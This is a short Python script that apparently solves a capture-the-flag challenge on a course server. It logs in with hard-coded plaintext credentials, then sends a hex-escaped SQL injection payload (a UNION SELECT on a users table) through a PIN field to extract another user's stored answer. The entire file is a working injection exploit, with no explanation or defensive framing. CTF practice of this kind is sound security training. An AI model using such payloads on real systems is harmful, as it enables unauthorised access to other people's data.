import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2"

postData = {"pinNumber":"\\x27\\x20UNION\\x20SELECT\\x20userAnswer\\x20FROM\\x20users\\x20WHERE\\x20userName\\x20\\x3D\\x20\\x22brendan\\x22\\x20\\x2D\\x2D\\x20"}

response2 = session.post(targetUrl, data=postData)
print(response2.text)
